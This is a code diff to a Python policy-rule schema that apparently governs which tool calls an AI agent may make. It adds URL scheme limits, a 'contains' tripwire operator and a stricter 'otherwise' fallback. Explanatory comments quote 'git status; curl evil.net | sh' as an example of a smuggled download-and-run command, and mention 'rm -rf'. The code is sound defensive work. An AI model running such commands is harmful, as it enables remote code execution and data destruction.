@@ -41,6 +41,11 @@ MAX_IN_VALUES = 100
 MAX_RULE_AGENTS = 100
 # A host name as written in a policy: lowercase ASCII (use punycode "xn--..." for
 # international names), optionally starting with "." to include subdomains.
+# A URL scheme in a host_in condition's "schemes" list, e.g. "https" or "wss".
+SCHEME_PATTERN = r"^[a-z][a-z0-9+.\-]{0,31}$"
+MAX_SCHEMES = 10
+# What host_in accepts when the condition has no "schemes".
+DEFAULT_URL_SCHEMES = ("http", "https")
 HOST_PATTERN = r"^\.?[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$"
 
 
@@ -124,14 +129,17 @@ class Op(StrEnum):
     ENDSWITH = "endswith"
     EXISTS = "exists"  # the argument is present (takes no value)
     MISSING = "missing"  # the argument is absent (takes no value)
-    # The URL's real host is one of these (any scheme/port/case). ".x.com" = x.com
-    # and any subdomain of it.
+    # The URL's real host is one of these (any port/case). ".x.com" = x.com and any
+    # subdomain of it. Only http/https URLs, unless the condition lists "schemes".
     HOST_IN = "host_in"
+    # The text argument contains this text (or any of a list of texts). Compares text,
+    # not meaning ("rm -fr" doesn't contain "rm -rf"): only for deny / require_approval.
+    CONTAINS = "contains"
 
 
 NUMBER_OPS = {Op.GT, Op.GTE, Op.LT, Op.LTE}
 PRESENCE_OPS = {Op.EXISTS, Op.MISSING}
-TEXT_OPS = {Op.EQ, Op.NEQ, Op.IN, Op.STARTSWITH, Op.ENDSWITH}  # may use ignore_case
+TEXT_OPS = {Op.EQ, Op.NEQ, Op.IN, Op.STARTSWITH, Op.ENDSWITH, Op.CONTAINS}  # may use ignore_case
 
 
 def is_number(value: object) -> TypeGuard[int | float]:
@@ -207,10 +215,48 @@ class Condition(BaseModel):
     value: JsonValue = None  # required for every op except exists / missing
     # Compare text without caring about upper/lower case, e.g. email domains.
     ignore_case: bool = False
+    # host_in only: the URL schemes this condition accepts (replaces http + https).
+    # A URL with any other scheme can't be checked: the whole request is denied.
+    schemes: Annotated[
+        tuple[Annotated[str, Field(pattern=SCHEME_PATTERN)], ...] | None,
+        WithJsonSchema(
+            {
+                "type": "array",
+                "items": {"type": "string", "pattern": SCHEME_PATTERN},
+                "minItems": 1,
+                "maxItems": MAX_SCHEMES,
+                "uniqueItems": True,
+                "title": "Schemes",
+            }
+        ),
+    ] = Field(default=None, min_length=1, max_length=MAX_SCHEMES)
+
+    @field_validator("schemes", mode="before")
+    @classmethod
+    def schemes_not_null(cls, value: object) -> object:
+        if value is None:
+            raise ValueError(
+                "'schemes' must be a list of URL schemes (leave it out for http/https)"
+            )
+        return tuple(value) if isinstance(value, list) else value
+
+    @field_validator("schemes")
+    @classmethod
+    def schemes_are_unique(cls, schemes: tuple[str, ...] | None) -> tuple[str, ...] | None:
+        if schemes is not None and len(set(schemes)) != len(schemes):
+            raise ValueError("'schemes' lists a scheme twice")
+        return schemes
+
+    @property
+    def url_schemes(self) -> tuple[str, ...]:
+        """The schemes a host_in condition accepts."""
+        return self.schemes if self.schemes is not None else DEFAULT_URL_SCHEMES
 
     @model_validator(mode="after")
     def value_fits_op(self) -> "Condition":
         # Catch policy mistakes at load time, e.g. "gt" with a text value.
+        if self.schemes is not None and self.op is not Op.HOST_IN:
+            raise ValueError("'schemes' only works with 'host_in'")
         if self.op in PRESENCE_OPS and self.value is not None:
             raise ValueError(f"'{self.op}' takes no value")
         if self.op in NUMBER_OPS and not is_number(self.value):
@@ -242,6 +288,15 @@ class Condition(BaseModel):
                     f"'host_in' needs a list of 1 to {MAX_IN_VALUES} lowercase host names, "
                     'e.g. ["api.example.com", ".example.com"]'
                 )
+        if self.op is Op.CONTAINS:
+            needles = self.value if isinstance(self.value, list) else [self.value]
+            ok = (isinstance(self.value, str) or 1 <= len(needles) <= MAX_IN_VALUES) and all(
+                isinstance(v, str) and v.strip() for v in needles
+            )
+            if not ok:
+                raise ValueError(
+                    f"'contains' needs a non-empty text or a list of 1 to {MAX_IN_VALUES} texts"
+                )
         if self.op in {Op.EQ, Op.NEQ} and not is_scalar(self.value):
             raise ValueError(f"'{self.op}' needs a text, number or true/false value")
         texts = self.value if isinstance(self.value, list) else [self.value]
@@ -251,9 +306,13 @@ class Condition(BaseModel):
         return self
 
 
+_STRICTNESS = {Decision.ALLOW: 0, Decision.REQUIRE_APPROVAL: 1, Decision.DENY: 2}
+
+
 class Rule(BaseModel):
     """One policy rule: when an agent asks for `tool` (and every `when` condition
-    holds), the answer is `effect`."""
+    holds), the answer is `effect`. With `otherwise`, the answer is `otherwise` when the
+    conditions don't all hold (it must be stricter than `effect`)."""
 
     model_config = ConfigDict(extra="forbid", strict=True, frozen=True)
 
@@ -279,6 +338,44 @@ class Rule(BaseModel):
             }
         ),
     ] = Field(default=None, min_length=1, max_length=MAX_RULE_AGENTS)
+    # Optional: the answer when the `when` conditions don't all hold (or an argument they
+    # look at is missing). Must be stricter than `effect`, so it can never loosen anything.
+    otherwise: Annotated[
+        Decision | None,
+        WithJsonSchema(
+            {"enum": [Decision.REQUIRE_APPROVAL.value, Decision.DENY.value], "title": "Otherwise"}
+        ),
+    ] = None
+
+    @field_validator("otherwise", mode="before")
+    @classmethod
+    def otherwise_not_null(cls, value: object) -> object:
+        if value is None:
+            raise ValueError("'otherwise' must be require_approval or deny (or left out)")
+        return value
+
+    @model_validator(mode="after")
+    def no_contains_in_allow_rules(self) -> "Rule":
+        # "allow when command contains 'git status'" also allows
+        # "git status; curl evil.net | sh". contains is a tripwire, not an allow list.
+        if self.effect is Decision.ALLOW and any(c.op is Op.CONTAINS for c in self.when):
+            raise ValueError(
+                "'contains' can't be used in an allow rule (it would also allow anything "
+                "around the text); use eq, in or startswith to allow"
+            )
+        return self
+
+    @model_validator(mode="after")
+    def otherwise_is_stricter(self) -> "Rule":
+        if self.otherwise is not None:
+            if not self.when:
+                raise ValueError("'otherwise' needs at least one 'when' condition")
+            if _STRICTNESS[self.otherwise] <= _STRICTNESS[self.effect]:
+                raise ValueError(
+                    f"'otherwise' must be stricter than 'effect' ({self.effect.value}): "
+                    f"allow -> require_approval or deny, require_approval -> deny"
+                )
+        return self
 
     @field_validator("agents", mode="before")
     @classmethod
